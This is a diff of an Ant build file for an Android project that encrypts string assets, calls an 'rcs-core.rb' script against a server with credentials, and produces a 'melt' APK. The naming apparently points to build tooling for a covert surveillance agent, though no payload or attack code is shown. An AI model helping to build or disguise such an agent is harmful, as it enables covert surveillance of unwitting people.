@@ -15,28 +15,26 @@
 
 	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
-			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
+			<pathelement path="../crypter/build/archive/crypter-ant.jar" />
 		</classpath>
 	</taskdef>
 
 	<taskdef name="random" classname="com.example.ant.RandomString">
 		<classpath>
-			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
-			<fileset dir="${basedir}/../crypter/lib">
+			<pathelement path="../crypter/build/archive/crypter-ant.jar" />
+			<fileset dir="../crypter/lib">
 				<include name="**/*.jar" />
 				<include name="**/*.zip" />
 			</fileset>
 		</classpath>
 	</taskdef>
 
+    <copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false"/>
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
-	<property name="ruby.path" value="C:/Ruby193/bin" />
-	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
 
-	<!-- proguard o dexguard
- -->
+	<property name="rcscore.path" value="antlibs"/>
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
 
@@ -78,8 +76,11 @@
 	</target>
 
 	<target name="encrypt-messages" depends="salt">
+        <mkdir dir="assets" />
+    
 		<delete file="res/raw/messages.bin" />
 		<delete file="assets/m.bin" />
+        
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="assets/m.bin" />
 		<delete file="res/raw/statusdb.bin" />
 		<delete file="assets/s.bin" />
@@ -241,8 +242,14 @@
 		<attribute name="password" />
 		<attribute name="file" />
 		<sequential>
-			<echo>@{server}</echo>
+			<echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
 
+			<exec executable="dir" dir="." failonerror="true">
+			</exec>
+			<exec executable="dir" dir="." failonerror="true">
+				<arg value="${rcscore.path}/rcs-core.rb" />
+			</exec>
+			
 			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
 				<arg value="${rcscore.path}/rcs-core.rb" />
 				<arg value="-u" />
@@ -356,12 +363,13 @@
 		<for list="default,v2" param="osversion">
 			<sequential>
 				<echo message="==============" />
-				<echo message="===  BUILD === ------------------------------------------------------------" />
+				<echo message="===  BUILD ===" />
 				<echo message="==============" />
 				<echo>Version @{osversion}</echo>
 
 				<for list="release,debug" param="kind">
 					<sequential>
+                        <echo>clean</echo>
 						<antcall target="clean" />
 
 						<echo message="bin/@{osversion}/@{kind}/core.android" />
@@ -373,6 +381,7 @@
 								<echo message="==============" />
 								<echo>call debug</echo>
 								<antcall target="debug" inheritAll="false" />
+                                <!-- <var name="filename" value="bin/android_networking-debug-unaligned.apk" /> -->
 								<var name="filename" value="bin/android_networking-debug.apk" />
 
 							</then>
@@ -380,6 +389,7 @@
 								<echo message="==============" />
 								<echo>call release</echo>
 								<antcall target="release" inheritAll="false" />
+                                <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
 								<var name="filename" value="bin/android_networking-release.apk" />
 							</else>
 						</iff>
@@ -401,6 +411,7 @@
 		<echo message="==============" />
 		<echo>BUILD merge</echo>
 		<antcall target="release" inheritAll="false" />
+        <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
 		<var name="filename" value="bin/android_networking-release.apk" />
 		<mkdir dir="output/merge/" />
 		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
@@ -455,5 +466,18 @@
 		-->
 
 	</target>
+    
+    <target name="ci">        
+        <echo>target ci</echo>
+        <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false"/>
+        <antcall target="build" />
+        <var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
+		<echo>${destdir}</echo>
+		<mkdir dir="${destdir}" />
+
+		<antcall target="servercore" />
+		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
+		<antcall target="updatetest" />
+    </target>
 
 </project>
